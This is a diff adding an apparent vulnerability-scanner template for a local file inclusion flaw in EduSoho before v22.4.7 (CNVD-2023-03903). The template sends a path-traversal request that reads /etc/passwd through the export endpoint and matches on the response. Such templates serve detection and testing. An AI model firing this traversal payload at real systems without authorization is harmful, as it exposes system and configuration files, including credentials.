@@ -1,0 +1,25 @@
+id: CNVD-2023-03903
+brief:
+    title: EduSoho < v22.4.7 - Local File Inclusion
+    by: s4e-io
+    level: high
+    about: The edusoho education and training system <v22.4.7 has unauthorized file reading vulnerability. Through this vulnerability, an attacker can read the contents of the config/parameters.yml file and o...
+    label:
+        - cnvd
+        - cnvd2023
+        - lfi
+        - edushoho
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - text/csv
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
